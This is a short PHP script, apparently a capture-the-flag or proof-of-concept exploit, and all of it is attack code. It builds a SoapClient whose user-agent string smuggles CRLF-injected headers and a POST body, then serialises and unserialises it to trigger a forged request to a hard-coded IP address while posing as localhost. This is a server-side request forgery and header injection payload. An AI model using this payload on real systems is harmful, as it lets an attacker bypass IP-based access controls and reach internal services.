<?php
$target = 'http://1.94.226.40:23333/111.php';
$post_string = 'TEST=this_is_a_test';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: xxxx=1234'
);
$b = new SoapClient(null,array('location' => $target,'user_agent'=>'admin^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri' => "aaab"));

$aaa = serialize($b);
$aaa = str_replace('^^','%0d%0a',$aaa);
$aaa = str_replace('&','%26',$aaa);
echo $aaa;
$us = unserialize($aaa);
$us->nonexist();
?>
